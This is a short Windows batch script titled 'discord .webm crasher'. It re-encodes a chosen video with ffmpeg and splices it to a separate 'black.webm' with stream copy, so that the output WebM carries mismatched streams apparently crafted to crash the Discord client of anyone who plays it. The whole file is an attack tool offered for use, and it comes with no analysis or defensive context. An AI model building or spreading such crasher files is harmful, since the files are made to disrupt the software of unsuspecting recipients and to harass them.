@echo off
title "discord .webm crasher"
set /p videoname=Type or drag-and-drop the source video:
set /p output=Type output video name:
ffmpeg -i %videoname% -pix_fmt yuv444p video.webm
(
echo file video.webm
echo file black.webm
)>"yeet.txt"
ffmpeg -f concat -i yeet.txt -codec copy %output%.webm
del "yeet.txt"
del "video.webm"
